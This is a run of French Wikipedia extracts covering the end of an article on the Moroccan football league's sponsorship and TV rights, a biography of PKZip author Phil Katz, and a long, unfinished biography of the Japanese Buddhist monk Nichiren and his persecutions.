"Mis à jour le 22 novembre 2022."
Transferts.
Classement des 20 transferts les plus chers 
Aspects socio-économiques.
Sponsoring.
Durant les années 2000 et 2010, le sponsor officiel et principal du GNF était Maroc Telecom, avec un montant annuel de 15 millions de dirhams. Ce contrat concernait tout autant la première division que la deuxième division. Le logo du sponsor figurait également dans les maillots de tous les clubs engagés dans ces deux compétitions.
De 2015 à 2019, le nom du Championnat devint "Botola Maroc Télécom". Depuis , Maroc Telecom n'est plus sponsor de la Botola.
Depuis la saison 2020-2021, Inwi est le nouveau sponsor officiel et principal du LNFP, dont ses Championnats portent le nouveau nom "Botola Pro1 Inwi" et "Botola Pro2 Inwi".
Droits TV.
En décembre 2006, le GNF a signé un contrat avec le bouquet TV ART Network pour la retransmission TV à l'international des matches d'un montant de 27 millions de $ pour une durée de 5 ans.
Par ailleurs, la SNRT, le diffuseur TV domestique et à l'étranger historique du GNF a renouvelé son contrat en septembre 2007, pour un montant total de 225 millions de DH sur 3 ans (à raison de 70 millions MAD pour la saison 2007-2008, 75 millions MAD pour 2008-2009 et 80 millions MAD pour 2009-2010).
Ainsi les 8 matches de chaque journée du championnat sont retransmis sur Bein Sport, Arryadia HD, Al Aoula HD, Tamazight HD et 2M.
En août 2010, la SNRT remporte l'appel d'offres lancé par la FRMF pour les saisons allant de 2010-2011 à 2013-2014, pour un montant total de 404 millions MAD, soit 101 millions MAD par saison, battant ainsi l'ancien record qui datait de la saison 2009-2010, reconduit par la suite jusqu'à la saison 2017-2018 pour le même montant annuel.
Le Championnat du Maroc de football reste le premier et seul championnat maghrébin où toutes les rencontres sont diffusées sur la télévision depuis 2006, et avec une qualité HD depuis 2018. Aussi, les matchs sont gratuits.
Primes monétaires.
A compter de la saison 2024/2025, les primes monétaires sont comme suit :

</doc>
<doc id="248676" url="https://fr.wikipedia.org/wiki?curid=248676" title="Gaius Plinius Secundus">
Gaius Plinius Secundus



</doc>
<doc id="248677" url="https://fr.wikipedia.org/wiki?curid=248677" title="Phil Katz">
Phil Katz

Phillip Walter Katz, plus connu sous le nom de Phil Katz (né le , mort le ) était un programmeur américain, inventeur de l'algorithme deflate et auteur du célèbre logiciel de compression PKZip.
Débuts.
Phil Katz obtint sa licence en sciences informatiques à l'université du Wisconsin à Milwaukee.
Sa première incursion dans le monde de la compression démarra au milieu des années 1980, grâce à la création d'une version plus rapide du célèbre programme ARC, qu'il appela PKArc. La vitesse de PKArc le rendit vite populaire, au grand dam des auteurs de ARC, System Enhancement Associates. Ces derniers poursuivirent Katz en justice et il fut contraint de changer son programme. Il sortit vite un nouveau programme appelé PKPak, qui était en tout point semblable à PKArc excepté l'extension qui était ".pak".
PKZip.
Katz remplaça rapidement PKPak par le nouveau et complètement réécrit PKZip, distribué comme shareware, qui compressait à la fois plus vite et mieux qu'ARC. Katz laissa cependant le format zip libre de droits. Il devint donc le standard pour la compression de données sur de nombreuses plateformes. Pensant que Windows ne serait qu'un effet de mode, il délaissa sa version de PKZip pour Windows, laissant ainsi le champ libre à Nicosoft, les auteurs de WinZip.
PKZip fit de Katz l'un des plus grands auteurs de shareware de tous les temps. Bien que sa compagnie PKWare (Phillip Katz Software) devint multimillionnaire, Katz confia sa gestion à des personnes de confiance et il continua d'écrire les logiciels lui-même.
Mort.
Katz se battit contre l'alcool pendant des années. Ses amis tentèrent de l'aider, mais il finit par les rejeter. Il fut arrêté de nombreuses fois pour conduite en état d'ivresse et pendant la fin de sa vie, il passait plus de temps dans des motels miteux et dans des clubs de striptease que dans sa propre maison.
On retrouva Katz mort dans une chambre d'hôtel avec une bouteille de schnaps à la menthe dans sa main le , à l'âge de 37 ans. Le rapport du médecin légiste statua qu'il était mort de pancréatite aiguë, à la suite de son alcoolisme.

</doc>
<doc id="248678" url="https://fr.wikipedia.org/wiki?curid=248678" title="Nichiren">
Nichiren

, ou simplement, Nichiren est un moine bouddhiste japonais de l’époque de Kamakura au (né le , mort le ). 
Il est le fondateur d'une école du bouddhisme mahayana, la Nichiren Shū (1253, initialement appelée , et du bouddhisme nichirenien. D'autres écoles se réclament des enseignements de Nichiren, les huit branches « historiques », comme la Nichiren Shōshū (fondé par un disciple du moine). Leurs pratiquants se concentrent essentiellement sur le "Sūtra du Lotus" à la lumière des "Écrits de Nichiren", et des commentaires rédigés par leurs maitres bouddhiques. C'est aussi le cas d'organisations néo-bouddhiques comme la Soka Gakkai, une branche laïque créée dans les années 1930, mais excommuniée du courant en 1991.
Le nom de naissance de Nichiren était . Intégrant l'école Tendai à l'âge de , on le nomma Yaku-o-maro. Plus tard, quand il prononça ses vœux et passa dans les ordres, il fut nommé . Enfin, il prit le nom de Nichiren le jour où il créa sa propre école. Nichiren signifie littéralement ("Nichi", “Soleil”, et "ren", contraction du mot "renge" “lotus”).
Nichiren fut en son temps un personnage controversé qui a échappé plusieurs fois à la mort au motif qu'il était virulent envers les autres écoles bouddhiques (en particulier Jōdo shū ou Nembutsu, Zen, Shingon et Ritsu), allant jusqu'à prêcher leur abolition. Il s'est ainsi attiré une forte hostilité des autorités politiques et religieuses. Il disait, en résumé, que : "le Nembutsu conduit dans l'enfer "Avīci", le Zen est l'œuvre du démon, le Shingon détruit la Nation et le Ritsu est traître".
Se considérant comme l'incarnation du bodhisattva (Jōgyō en japonais), il en assume la mission et enseigne la récitation du titre ("daimoku") du "Sûtra du Lotus" sous la forme du mantra "Nam(u)-myōhō-renge-kyō", avec la conviction que c'est le seul enseignement, facile à mettre en pratique et identique pour les quatre sortes de croyants (hommes et femmes, laïques et religieux), qui puisse conduire les êtres vivants à la bouddhéité en cette vie à l'époque de Mappō.
Biographie.
Enfance et années d'études.
Enfance et éducation dans un contexte de catastrophes pour la population.
Nichiren est né le à Kominato, un hameau de pêcheurs de la côte Pacifique faisant partie du village de Tojo, situé dans la province japonaise d'Awa (dans l’actuelle préfecture de Chiba). Ce site est classé parmi les “Quatre Lieux Sacrés du bouddhisme de Nichiren”. Sa naissance a lieu cinq mois avant un grand tremblement de terre à Kamakura, nouvelle capitale du Japon où s’est installé le gouvernement et les dirigeants politiques du pays, les shoguns ayant pris le dessus sur l’empereur (Mikado).
Le nom d'enfant de Nichiren était Zennichi-maro.
Son père, Nukina Jiro Shigetada, connu aussi sous le nom de Mikuni no Tayu Shigetada, , aurait été un petit fonctionnaire travaillant pour un manoir voisin du village. Sa mère, quant à elle, s'appelait Umegiku-nyo . On sait peu de choses sur les parents de Nichiren. Il affirma en être « le fils d'un humble pêcheur », « fils d’une famille de "chandâla" qui vivait sur le littoral, à Tōjō, dans la province d’Awa, un coin reculé à l’est du Japon. »
Au printemps , il entre au . Il reçoit le nom de Yaku-o-maro ; sous la direction du supérieur, Dōzen-bō, il bénéficie d’une instruction habituellement réservée aux jeunes de l’aristocratie japonaise, étudiant aussi bien les principes du bouddhisme Tendai qu’un enseignement général. Il devient moine en et prend le nom de où Renchō signifie “croissance du lotus”.
Dans sa “Lettre aux moines du Seichō-ji” écrite en , il déclare avoir prié devant la statue de Kokūzō Bosatsu, proche de chez lui, pour devenir l’homme le plus sage du Japon et avoir obtenu un « joyau de sagesse » lui permettant de comprendre l’essence de chaque sūtra.
Au printemps , il part pour Kamakura afin d’approfondir ses connaissances dans les principaux centres bouddhiques. Il se donne pour mission d’étudier les textes de référence et leurs commentaires de toutes les écoles.
Deux tremblements de terre frappent la population de Kamakura en février et avril .
Au printemps , il revient au Seichō-ji puis part pour Enryaku-ji, sur le mont Hiei où il poursuit ses études tandis qu’en juin Hōjō Tsunetoki devient le quatrième régent après le décès de son grand-père qui avait organisé la mainmise du clan sur la régence.
Il revient au Enryaku-ji en . En mars , des incendies ravagent la ville de Kyōto, puis la ville de Kamakura en février et en février lors de ses études au Onjō-ji. Il revient au Seichō-ji en tandis qu’en février tempête et tremblement de terre frappent à nouveau Kamakura.
Il ne peut que constater, après une nouvelle série de catastrophes qui sévirent de à , tremblement de terre, tempête, famine, épidémie s’étendant sur deux années, que 
Éducation Tendai.
Lors de son entrée au temple, Nichiren pria le bodhisattva Kokûzô, le bodhisattva de la vacuité une divinité de l'ésotérisme japonais afin de découvrir la véritable intention des enseignements du bouddha historique, Shākyamuni.
Nichiren voulait comprendre la raison pour laquelle le peuple, qui avait placé toute sa confiance dans le Nembutsu, continuait à souffrir et subissait des morts terribles et douloureuses. Nichiren voulait aussi comprendre pourquoi l'Empereur japonais avait été vaincu par le shogun en alors que la divinité Hachiman avait fait la promesse de soutenir la famille impériale jusqu'au centième empereur.
Enfin, Nichiren voulait savoir quelle école bouddhique suivait les véritables enseignements du bouddha Shakyamuni.
À l'âge de , il fut ordonné prêtre par son maître Dozen-bō, pour lequel Nichiren a toujours ressenti un "devoir de reconnaissance". Nichiren reçut alors le nom de Zeshō-bō Renchō. L'année suivante, en , il partit pour Kamakura, la capitale du shogunat, pour continuer et approfondir ses études. Trois ans plus tard, il revint brièvement au Seichō-ji avant de repartir pour les grands centres d’étude de son époque. Nichiren resta à Kamakura jusqu'en .
Pendant ses années d'études, Nichiren voyagea ponctuellement à travers le Japon, visitant les grands temples et monastères de son époque, les temples Onjo-ji, Kongōbu-ji, Shitennō-ji, etc. cherchant à pousser toujours plus loin sa formation. Dans ces lieux, il fit l'expérience directe de toutes les formes du bouddhisme pratiqué au Japon, y compris la dévotion de l'école Jōdo shū, école bouddhique dominante à l'époque de Nichiren ; le Shingon ésotérique ; la méditation de l'école Zen ; et la stricte discipline du Kairitsu. Il étudia aussi les divers textes bouddhiques (sutras) de ces temples pour voir par lui-même ce que le bouddha historique, Shākyamuni, avait réellement enseigné.
Nichiren séjourna, ensuite, au temple Enryaku-ji, fondée par le grand maître Tendai Saichō et situé au mont Hiei. Il resta dans ce temple de à , soit jusqu'à ses . Après plusieurs années d'études, Nichiren arriva à la conclusion que le "Sūtra du Lotus" était le sommet des enseignements du Bouddha dans lequel celui-ci exposait clairement la Loi bouddhique (Dharma) ou « Vérité ultime » du bouddhisme.
Nichiren, éduqué sous une influence Tendai, analysa puis reprit l'idée de Zhiyi, patriarche de cette même école, selon laquelle les huit dernières années de la vie du bouddha Shākyamuni, où il enseigna le "Sūtra du Lotus", étaient les plus importantes car le Bouddha y exposait son Éveil spontanément et non plus en réponse à la question d’un disciple.
Fondations du bouddhisme de Nichiren.
Sho Tempōrin de Nichiren.
À l'âge de , Nichiren revient au Seichō-ji. Au matin du , face au soleil levant, ayant escaladé le Mont Kiyosumi, dans la province d'Awa (actuel département de Chiba), il récite ce qui est, selon lui, la Loi bouddhique pour l’époque de la Fin de la Loi de Shakyamuni :"Nam Myōhō Renge Kyō". Cet événement est considéré comme le début de sa mission de propagation. Il prend à cet instant le nom par lequel il est connu de nos jours, Nichiren, qui signifie "Soleil-Lotus", en référence à la lumière du soleil qui dissipe l'obscurité et à la pureté de la fleur du lotus contenant simultanément la graine, la fleur et le fruit (cause et conséquence) et qui pousse dans des marécages sans que la pourriture environnante (eau boueuse) ne la salisse. Ces images se trouvent en évidence dans le "Sūtra du Lotus" et sont les qualités que Nichiren souhaite incarner et partager avec les pratiquants.
À midi, le même jour, pour célébrer la fin de ses études, Nichiren tient son premier sermon devant son vieux "Sensei" Dozen-bō et ses condisciples. Ce discours choque l'auditoire par sa critique du bouddhisme populaire connu sous le nom de “Terre pure” et qui enseigne que la bouddhéité ne peut être atteinte qu'après la mort dans une “terre pure céleste”, grâce à la psalmodie répétitive du nom du bouddha Amida, communément appelée nembutsu.
À la place de cette pratique, Nichiren préconise la récitation mantrique de "daimoku" ou de l'Odaimoku du "Sūtra du Lotus", c'est-à-dire la récitation de "Nam(u) Myōhō Renge Kyō". Il enseigne cette pratique en tant que voie pratique et accessible par laquelle tous les êtres humains peuvent réaliser les “Vérités fondamentales” du bouddhisme. De même que le nom d'un pays inclut toutes ses caractéristiques, le titre du "Sūtra du Lotus" inclut tous les mérites et vertus du bouddha Shākyamuni exposés dans ce sūtra. Nichiren enseigne aussi que grâce à la récitation de ce "daimoku", chaque personne peut recevoir directement la “Vérité ultime” du "Sūtra du Lotus" et atteindre la bouddhéité dès cette vie-ci. Ce sermon lui vaut immédiatement des protestations et des menaces de la part des autorités politiques et religieuses en place. Notamment, le seigneur local, Tojo Kagenobu, fervent disciple de la Terre pure, qualifie ce discours de blasphématoire et tente de le faire arrêter.
Ce discours inaugural du est commémoré par les institutions qui se réclament de Nichiren.
Sentant que sa vie est en danger, Nichiren se réfugie à Kamakura, capitale du shogunat et se met à prêcher, à tout venant, à des personnes ordinaires : paysans, marchands, artisans, pêcheurs et même aux samouraïs de rang moyen. C'est ainsi que Nichiren se fait connaître comme Grand Maître (ou Grand Sage : le Daishonin) et réformateur du bouddhisme qui se consacre à sauver de la souffrance, les gens du commun. Nichiren leur offre l'essence même des enseignements les plus élevés du bouddhisme sous forme d'une pratique simple mais néanmoins profonde, la pratique de "Daimoku" comme “moyen habile” d'atteindre la bouddhéité. Nichiren met également en évidence les erreurs d'élitisme des écoles décadentes et des mouvements qui déforment, selon lui, le véritable esprit du "Dharma" bouddhique et demande la suppression des dons, crédits et subventions à ces écoles.
Sur l’établissement de l’enseignement correct pour la paix dans le pays ("Risshō Ankoku ron").
De à , le Japon a connu de nombreux désastres naturels : tremblements de terre, typhons, famine et peste. En réaction à tant de douleurs et souffrances qui affigent la population, Nichiren rédige un de ses écrits ("gosho") les plus importants, le (ou “Traité sur la Paix dans le Pays grâce à l'Établissement du Vrai Dharma”), le , dans lequel il enseigne que les gens doivent abandonner toute croyance dans des doctrines erronées et suivre la “Loi bouddhique correcte” qui convient à l’époque. Sur cette base, le peuple japonais pourrait établir une “terre pure” dès cette vie-ci.
Nichiren fait, dans un premier temps, une remontrance au gouvernement en demandant au shogunat de Kamakura de cesser de soutenir financièrement les écoles, sources de ses difficultés à propager sa doctrine : à l’époque de Kamakura, au Japon, toutes les institutions religieuses n'existaient qu'avec l'accord et/ou le patronage du gouvernement. Dans un second temps, il l'invite à plutôt soutenir l’enseignement réellement conforme à l’époque. (Nichiren n'était pas le premier à agir de la sorte, cela faisait partie d'une longue tradition en Asie de l'Est, Confucius notamment tenta de réformer le gouvernement de son époque).
Étayant ses propos par les prophéties faites dans plusieurs "sūtra" du bouddha Shākyamuni, Nichiren attribue l'apparition de ces catastrophes comme marquant le début de la nouvelle ère de "Mappō" et il préconise, pour enrayer ces phénomènes, l'établissement d'une “Loi correcte” valide pour cette époque : la dévotion au "Sūtra du Lotus". De fait, le "Sūtra de la Grande Collection" fait référence aux trois calamités qui se produisent à la fin d’un "kalpa" (la guerre, les épidémies et la famine ou l’inflation provoquée par une pénurie de grains) et prédit comment le bouddhisme sera propagé durant les cinq périodes de cinq cents ans suivant la disparition de Shakyamuni.
“Sur l’établissement de l’enseignement correct pour la paix dans le pays” est rédigé sous la forme de questions-réponses échangées entre un hôte et un visiteur ; l’hôte est en réalité Nichiren et le visiteur Hōjō Tokiyori. Il y est prédit que les calamités de rébellion interne et d’invasion étrangère n’étant pas encore apparues, elles surviendront inévitablement si le pouvoir continue à refuser sa doctrine : faute d’accepter une forme correcte de bouddhisme à l'époque de "Mappō", la population japonaise subirait encore davantage de désastres et de catastrophes.
Le , Nichiren va présenter cet écrit à Hōjō Tokiyori, cinquième "shikken" (régent) du shogunat de Kamakura. Il y développe les raisons pour lesquelles le gouvernement devrait arrêter toute aide à l’école Jōdo fondée par Hōnen et soutenir au contraire ceux qui placent leur foi dans le "Sūtra du Lotus". Il prévient le gouvernement que dans le cas contraire, le pays devra faire face à ces deux nouveaux désastres, la guerre civile et l’invasion étrangère. Toutefois si le pays se tourne vers le "Sūtra du Lotus", la paix et la prospérité seront établies.
Nichiren n’a obtenu aucune réponse de la part du shogunat.
En définitive, ses prophéties de guerre civile et d'invasion étrangère vont se révéler justes quand Hōjō Tokisuke se révoltera contre son plus jeune demi-frère, le régent Hōjō Tokimune, en , et quand les Mongols de Kubilai Khan attaqueront le Japon par deux fois, en et .
S’agissant de cette remontrance faite au gouvernement, Nichiren se fonde sur le principe bouddhique que l’environnement reflète l’esprit et le cœur des gens qui y habitent : les conditions de vie d’une personne sont le reflet de sa vie intérieure, il en va de même pour une nation.
Il insiste donc sur la nécessité d’une foi positive dans la possibilité pour les personnes ordinaires d'atteindre l’illumination, la bouddhéité, dès cette vie-ci, de manière à transformer le monde actuel en “terre pure” selon ce qu'enseigne le "Sūtra du Lotus".
Cette vision pouvait certainement sembler bien plus satisfaisante pour ses adeptes que celle des enseignements de l’école Jōdo shū de n’espérer le bonheur qu’après la mort.
Ainsi, “Sur l’établissement de l’enseignement correct pour la paix dans le pays” est une critique de la gestion shogunale des affaires religieuses et “sociales” : ce texte écrit en vise à une réelle réforme spirituelle en faveur du peuple japonais, pour que tous les gens du commun puissent surmonter leurs souffrances et partager avec le reste du monde l’enseignement et la pratique du "Sutra du Lotus" ; pourtant certains ont persisté à l’assimiler à un document nationaliste. Il n’en demeure pas moins que, même si Nichiren s’appuie sur le "Sūtra du Nirvana", quelques extraits de ce "Risshō Ankoku ron" restent virulents envers les autres écoles bouddhiques. De manière générale, plusieurs spécialistes relèvent l'intolérance de Nichiren, sans précédent dans le bouddhisme ; elle serait une réaction aux critiques faites au "Sutra du Lotus". Cherchant l’origine des catastrophes dans la calomnie de la Loi bouddhique, il critique particulièrement l’école Jōdo Shū et l’ouvrage de Hōnen (法然) intitulé "Choix du Nembutsu par-dessus tout", et met en cause les écoles Shingon, Zen, Tendai, Kegon, Sanron, Hossō, Jiron et Shōron. Certains l’accusent d’avoir prononcé ces mots : .
Toutefois Nichiren déclare : 
Cinq ans plus tard, en , Nichiren exposera ses points de désaccord fondamentaux dans “Conversation entre un sage et un ignorant”.
Nichiren s’expliquera sur ses prédictions et les motivations de ses remontrances aux autorités politiques et religieuses : , lettre envoyée en octobre en 1268 à onze responsables politiques et religieux de haut rang, notamment le régent Hōjō Tokimune, le moine Zen Dōryu du Kenchō-ji, et le moine restaurateur de l’école Ritsu, Ryōkan, en déclarant que les prédictions de son traité étaient en train de s’accomplir et en demandant le droit de démontrer la validité de ses enseignements dans un débat religieux public. Il n’obtint de nouveau aucune réponse. D’autre part, il complétera ses motivations en en exposant les réactions suscitées juste après puis beaucoup plus tard par les moines du Nembutsu, les maîtres du Shingon et d’autres encore qui éprouvèrent du ressentiment à son égard et conspirèrent contre sa vie.
Oppression et répression.
Quatre grandes persécutions.
Persécution de Matsubagayatsu.
Les efforts de Nichiren pour promouvoir les réformes shogunales étaient non seulement ignorés mais provoquaient la colère des autorités bouddhistes et du gouvernement qui n'appréciait pas que l'on critique ses règles. La nuit du , la maison de Nichiren située à Matsubagayatsu, quartier de Kamakura subit un incendie. Cette attaque fut perpétrée par des croyants du Nembutsu, à la suite des critiques formulées par Nichiren sur l'école de la Terre pure dans son écrit “Sur l’établissement de l’enseignement correct pour la paix dans le pays”.
Nichiren, prévenu à temps, pu fuir dans les collines lors de cette attaque. Il se réfugia chez Toki Jonin, un de ses disciples, plus tard connu sous le nom de Nichijo, dans la province de Shimōsa. Nichiren resta plusieurs mois hors de Kamakura, continuant toujours à enseigner le "Sūtra du Lotus" à ses disciples. Il y revint au printemps suivant pour continuer à prêcher sa doctrine.
Cet événement est reconnu en tant que la .
Exil dans la province d'Izu.
Peu de temps après son retour, Nichiren fut arrêté par la police du shogunat. Le , sans enquête, il fut condamné et envoyé en exil à Itō, petite péninsule rocheuse de la province d'Izu. Ses ennemis espéraient que l'exposition aux fortes intempéries de cette région, lui serait fatale. Cependant les hommes chargés de l'y conduire l'abandonnèrent sur la plage d'un petit village du nom de Kawana où il fut trouvé par un pêcheur nommé Funamori Yasaburo. Cet homme et sa femme le nourrirent et le logèrent clandestinement pendant une trentaine de jours.
À l'époque, le seigneur intendant d'Itō, Itō Hachiro Zaemon, était gravement malade. Apprenant que Nichiren avait été exilé dans sa province, il l'invita à demeurer chez lui et à prier pour sa guérison. Nichiren accepta à la condition que lui-même adhère à la pratique du "Sūtra du Lotus", le Daimoku. Celui-ci accepta et recouvra la santé et devint dès lors un fervent disciple de Nichiren. En remerciement, il offrit à Nichiren, une statue du bouddha Shākyamuni trouvée en mer et qui accompagna Nichiren durant toute sa vie.
Profitant de son exil pour faire comprendre sa mission et celle de ses disciples, il rappela que celui qui enseigne le “"Dharma" correct” se trouvera immanquablement confronté aux opposants ou ennemis de la propagation du "Sūtra du Lotus" cités au chapitre 13 (L'exhortation à sauvegarder le sūtra en dépit des persécutions) et qu’il devra, par ailleurs, tenir compte des différences entre les divers enseignements, de la capacité des pratiquants, de l'époque, des spécificités du pays et de la chronologie des sutras, établissant cinq guides pour la propagation afin que ses disciples puissent enseigner le “"Dharma" correct” de façon efficace.
Cette deuxième persécution est parfois commémorée le en tant que l’“Exil d'Izu”.
Persécution de Komatsubara.
Le , Nichiren fut gracié et autorisé à revenir à Kamakura. Il reprit la propagation du "Sūtra du Lotus". Apprenant que sa mère était malade et à l'article de la mort, son père étant décédé neuf ans auparavant, Nichiren prit le risque de revenir dans la province d'Awa dont le seigneur local, Tojo Kagenobu, était toujours son ennemi juré. En , malgré la réticence de ces disciples, il alla voir sa mère et par ses prières lui permit de recouvrer la santé.
Sur le chemin du retour, Nichiren et ses disciples furent invités par Kudo Yoshitaka, seigneur du village d'Amatsu dans la province d'Awa et situé au beau milieu de la “Forêt de Pins” appelée "Komatsubara". Quand Tojo Kagenobu et ses hommes apprirent que Nichiren se trouvait dans cette forêt isolée, ils décidèrent de lui tendre une embuscade. Le seigneur se précipita au secours de Nichiren avec ses propres hommes. Dans cette bataille, qui se déroula le , Tojo Kagenobu et Kudo Yoshitaka furent tous deux mortellement blessés. Kyonin-bo, un des disciples de Nichiren, fut également tué et deux autres disciples grièvement blessés. Nichiren lui-même en réchappa à grand-peine, ayant reçu un coup d'épée sur la tête.
Cette troisième persécution est parfois commémorée le comme la “Persécution de Komatsubara”.
Persécution de Tatsunokuchi.
En , le Japon connut une longue sécheresse et le gouvernement avait ordonné au moine Ryōkan-bō, du temple Gokuraku-ji de Kamakura, de prier pour obtenir la pluie. Nichiren lui lança un défi, disant que si les prières de Ryōkan-bō étaient efficaces dans les sept jours, il deviendrait son disciple, mais que si elles ne l’étaient pas, Ryōkan-bō devrait adopter la croyance dans le "Sūtra du Lotus". Celui-ci accepta volontiers et entama son rituel de prière. Pourtant au lieu de la pluie, ce furent de grands vents persistants et destructeurs qui se levèrent. Humilié, Ryōkan-bō refusa de tenir sa promesse. Au contraire, il commença même à user de son influence auprès des épouses et veuves de hauts fonctionnaires du gouvernement pour répandre de fausses rumeurs sur Nichiren.
En conséquence Nichiren fût convoqué pour être interrogé, par l'adjoint au chef des affaires militaires et de la police, Hei no Saemon, le . Nichiren saisit cette occasion pour faire des remontrances à Hei no Saemon, lui prédisant des luttes internes et une invasion étrangère si le gouvernement le punissait injustement. Hei no Saemon, n'ayant aucun élément lui permettant de prononcer lui-même une condamnation, laissa partir Nichiren.
La prédiction de Nichiren se réalisa. Des émissaires mongols envoyés de Corée vinrent réclamer au Japon de leur payer un tribut. En cas de refus, les Mongols menaçaient d'envahir le Japon. Le shogunat refusa. Les Mongols à cette époque, avaient déjà envahi la Chine et la Corée. Il semblait donc qu'une invasion du Japon soit imminente. Pour la deuxième fois, Nichiren exposa ses remontrances au gouvernement, essayant de le convaincre de changer d'attitude. Il rappela notamment aux autorités politiques et religieuses sa prédiction, huit ans plus tôt, dans son traité "Risshō Ankoku ron". Mais le shogunat n'envisagea aucune réforme.
Dans l'après-midi du , une décision officielle fut prise à l'encontre de Nichiren. Hei no Saemon et plusieurs centaines de guerriers se rendirent alors à cheval à sa résidence et l'arrêtèrent. L'un des hommes, Shofu-bo, saisit le rouleau du volume du "Sūtra du Lotus" que Nichiren portait dans sa robe et s'en servit pour le frapper au visage. Hei no Saemon amena Nichiren au bureau des conseillers du régent où il fut accusé de trahison et condamné à la peine d'exil sur l'île de Sado. Cependant, Hei no Saemon décida, en secret, de faire décapiter Nichiren avant qu'il n'atteigne ce dernier lieu. Ses hommes et lui quittèrent donc la résidence avec leur prisonnier tard dans la nuit du . Alors qu'ils passaient près du temple de Tsurugaoka dédié à la divinité Hachiman, Nichiren fit des reproches au Grand Bodhisattva Hachiman qui, selon lui, ne protégeait pas un fervent disciples du "Sūtra du Lotus" comme cela a été promis lorsque le Bouddha avait exposé ce sūtra.
Arrivé sur le lieu de l'exécution, Nichiren récita le "Daimoku", allant jusqu’à réprimander le chagrin de son disciple Shijo Kingo venu mourir avec lui, lui disant qu'il n'existait pas de sort plus enviable que celui de donner sa vie pour le "Sūtra du Lotus".
Au moment où Nichiren allait être décapité, un objet lumineux traversa le ciel, en provenance du Sud-Est, terrorisant les soldats et les samouraïs au point qu'ils furent incapables de procéder à l'exécution. Nichiren fut alors placé sous surveillance, comme originellement prévu, pendant un mois et le , il quitta Kamakura sous escorte pour le lieu de son exil, l'île de Sado.
Cette et dernière persécution est commémorée par certains le en tant que “Persécution de Tatsunokuchi”.
. Les pratiquants de la Nichiren Shū y voit, quant à eux, la confirmation l’identification de Nichiren au boddhisatva Conduites-supérieures (Jōgyō) à qui le bouddha Shakyamuni transmit la Loi dans le "Sūtra du Lotus".
Exil sur l'île de Sado.
Le , Nichiren fut envoyé sur l'île de Sado dans la mer du Japon, au large de la ville portuaire de Niigata, dans un sanctuaire en ruine près du cimetière de Tsukahara, sans nourriture ni vêtements adéquats. Une fois de plus ses ennemis espéraient qu'il mourrait de froid durant l'hiver impitoyable de Sado sans abri ni provisions. Mais c'était sans compter sur la foi et la détermination inébranlables de Nichiren qui lui permirent de supporter des conditions extrêmes et de se lier d'amitié avec les paysans et les samouraïs des environs qui finirent par pourvoir à ses besoins.
Pendant son exil, les adeptes locaux du Nembutsu, apprenant que des paysans aidaient Nichiren à survivre, décidèrent de conspirer contre lui et firent une tentative de l’éliminer. Ils convoquèrent les adeptes du Zen et du Kairitsu de l’île de Sado, le , pour un débat religieux ayant pour but de condamner pénalement Nichiren. Ce débat est connu sous le nom de “Débat de Tsukahara”. Lors de ce débat, devant les arguments de Nichiren, beaucoup de paysans et de samouraïs se convertirent au bouddhisme de Nichiren dont Abutsu-bō et sa femme Sennichi, qui admiraient la grandeur du personnage et qui deviendront, plus tard, des grands amis de Nichiren.
Non seulement Nichiren survécut à toutes ces privations mais il écrivit deux de ses écrits majeurs. Le premier est “Sur l’ouverture des yeux”, qu'il termina en . Dans ce traité, Nichiren cherche à ouvrir les yeux de toutes les personnes au fait que le temps était venu de pratiquer le véritable enseignement, la “Loi correcte”, c'est-à-dire la foi au "Sūtra du Lotus". Le "Kaimoku shō" révèle également que Nichiren a pris conscience d'être en train d'accomplir le rôle du bodhisattva Conduite-supérieures (Jōgyō) ou du "Bouddha Originel", selon les écoles, en tant qu'envoyé du "Sūtra du Lotus". À partir de ce moment, Nichiren n'essaya plus simplement de réformer le bouddhisme, il enseigna la Loi merveilleuse du Bouddha sous la forme de "Nam-myōhō-renge-kyō".
En , Nichiren fut transféré dans une résidence plus confortable sur l'île de Sado. À l'abri des éléments et des privations, Nichiren écrivit un autre de ses écrits les plus importants, “L’objet de vénération pour observer l’esprit, établi dans la cinquième période de cinq cents ans après la disparition de l’Ainsi-Venu” qu'il termina le . Dans ce traité, il décrit la transmission du "Dharma" (la Loi bouddhique) à tous les êtres, dits sensitifs. C’est après ce traité que Nichiren inscrivit pour la première fois, le "Gohonzon", le . Ce mandala est une représentation visuelle, en caractères sanskrits, chinois et japonais, de la “Cérémonie dans les Airs”. Dans ces chapitres, il est révélé que chaque personne peut atteindre l’éveil d’un "samyaksambuddha" dans cette vie-ci et que l'essence même de ce sūtra a été confié aux « bodhisattvas surgis de Terre » conduits notamment par le Grand Bodhisattva Conduites-supérieures (Jōgyō) : le Bouddha lui a confié la propagation du "Sūtra du Lotus" à la période de "Mappō", période décrite dans le chapitre du "Sūtra du Lotus". Pour Nichiren, le "Gohonzon" concrétise la Loi éternelle et intrinsèque de "Nam-myōhō-renge-kyō", qu'il a identifié comme étant la loi suprême qui imprègne la vie et l'univers.
À la différence des formes précédentes de contemplation qui dépendaient de la capacité du pratiquant à percevoir la “Vraie Nature de la réalité”, Nichiren enseigna que cette vraie nature se manifeste à nous sous la forme de "Nam(u) myōhō renge kyō". En d'autres termes, la bouddhéité n'est pas quelque chose que nous pouvons développer par nos efforts conscients. La “Vraie Nature de la réalité” nous est révélée par notre nature de bouddha, la présence spirituelle de la bouddhéité dans notre vie.
Le commémore le début de cet exil de Sado (佐渡の, jp."Sado no Kuni") qui fait suite à la persécution.
Retraite sur le mont Minobu.
Prédictions et correspondances de Nichiren.
En , Nichiren avertit Hōjō Tokiyori que le gouvernement courait à sa perte et ne ferait qu’augmenter les malheurs du pays et de sa population si rien n’était fait pour reconnaître aux yeux de tous son école fondée en , seule adaptée à l’époque, et le "Sūtra du Lotus " comme véhicule unique.
Nichiren argumente ainsi ses prédictions : puisque parmi les “sept calamités”, annoncée dans le "Sūtra du Maître-de-la-Médecine" et le "Sūtra des rois bienveillants", certaines étaient déjà advenues (été glacial et grande famine en ; tremblements de terre en février et avril puis en ; inondations hors saison ; tempêtes en ; incendies à Kyoto en et Kamakura en puis et par trois fois en (en avril, août et novembre) ; année de la “Grande Pandémie”, alors des luttes internes et des invasions étrangères ne manqueraient pas de se produire.
